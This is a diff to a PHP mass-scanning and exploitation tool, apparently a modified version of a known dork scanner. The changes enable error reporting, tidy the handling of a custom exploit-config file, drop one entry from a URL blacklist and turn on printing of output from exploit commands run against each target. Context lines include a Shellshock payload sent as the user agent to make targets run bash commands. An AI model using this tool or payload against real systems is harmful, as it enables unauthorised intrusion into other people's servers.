@@ -89,7 +89,7 @@
 
  */
 
-error_reporting(0);
+error_reporting(-1);
 set_time_limit(0);
 ini_set('memory_limit', '256M');
 ini_set('display_errors', 0);
@@ -175,10 +175,10 @@ $_SESSION['config']['cont_url'] = 0;
 $_SESSION['config']['cont_valores'] = 0;
 
 #[+] FILE MANAGEMENT EXPLOITS.
-
-If($opcoes['custom-config']){
+if($opcoes['custom-config']){
 	echo $opcoes['custom-config']." : SET AS Command CONFIG (Mod by K00B404)";
-	$_SESSION['config']['file_exploit_conf'] = $opcoes['custom-config'];
+  $_SESSION['config']['file_exploit_conf'] = $opcoes['custom-config'];
+
 }
 else{
 	$_SESSION['config']['file_exploit_conf'] = 'exploits.conf';
@@ -199,7 +199,7 @@ $_SESSION['config']['user_agent_xpl'] = "() { foo;};echo; /bin/bash -c \"expr 29
 #[+]BLACK LIST URL-STRINGS
 $_SESSION['config']['blacklist'] = "//t.co,google.,youtube.,jsuol.com,.radio.uol.,b.uol.,barra.uol.,whowhere.,hotbot.,amesville.,lycos,lygo.,orkut.,schema.,blogger.,bing.,w3.,yahoo.,yimg.,creativecommons.org,ndj6p3asftxboa7j.,.torproject.org,.lygo.com,.apache.org,.hostname.,document.,";
 $_SESSION['config']['blacklist'].= "live.,microsoft.,ask.,shifen.com,answers.,analytics.,googleadservices.,sapo.pt,favicon.,blogspot.,wordpress.,.css,scripts.js,jquery-1.,dmoz.,gigablast.,aol.,.macromedia.com,.sitepoint.,yandex.,www.tor2web.org,.securityfocus.com,.Bootstrap.,.metasploit.com,";
-$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,kbhpodhnfxl3clb4,.scanalert.com,.prototype.,feedback.core,";
+$_SESSION['config']['blacklist'].= "aolcdn.,altavista.,clusty.,teoma.,baiducontent.com,wisenut.,a9.,uolhost.,w3schools.,msn.,baidu.,hao123.,shifen.,procog.,facebook.,twitter.,flickr.,.adobe.com,oficinadanet.,elephantjmjqepsw.,.shodan.io,.scanalert.com,.prototype.,feedback.core,";
 $_SESSION['config']['blacklist'].= "4shared.,.KeyCodeTab,.style.,www/cache/i1,.className.,=n.,a.Ke=,Y.config,.goodsearch.com,style.top,n.Img,n.canvas.,t.search,Y.Search.,a.href,a.currentStyle,a.style,yastatic.,.oth.net,.hotbot.com,.zhongsou.com,ezilon.com,.example.com,location.href,.navigation.,";
 $_SESSION['config']['blacklist'].= ".bingj.com,Y.Mobile.,srpcache?p,stackoverflow.,shifen.,baidu.,baiducontent.,gstatic.,php.net,wikipedia.,webcache.,inurl.,naver.,navercorp.,windows.,window.,.devmedia,imasters.,.inspcloud.com,.lycos.com,.scorecardresearch.com,.target.,JQuery.min,Element.location.,";
 $_SESSION['config']['blacklist'].= "exploit-db,packetstormsecurity.,1337day,owasp,.sun.com,mobile10.dtd,onabort=function,inurl.com.br,purl.org,.dartsearch.net,r.cb,.classList.,.pt_BR.,github,microsofttranslator.com,.compete.com,.sogou.com,gmail.,blackle.com,boorow.com,gravatar.com,sourceforge.,.mozilla.org";
@@ -1253,7 +1253,7 @@ function __configExploitsExec($id, $alvo) {
         print !is_null($final__) ? "\n{$barra}[ EXPLOIT ]:: {$final__[0]} /[ ID ]:: {$value} /[ COMMAND ]:: " . $final__[1] : NULL;
         echo "\n      ------------------------------------------------------------------------------------------------------------------";
         $ExtOutput =  !is_null($final__) ? __command($final__[1], $alvo) : NULL;
-        //print $ExtOutput;
+        print $ExtOutput;
         DB_Log_ext_command($final__[1],$alvo['url_clean']);
 
        // var_dump($final__);
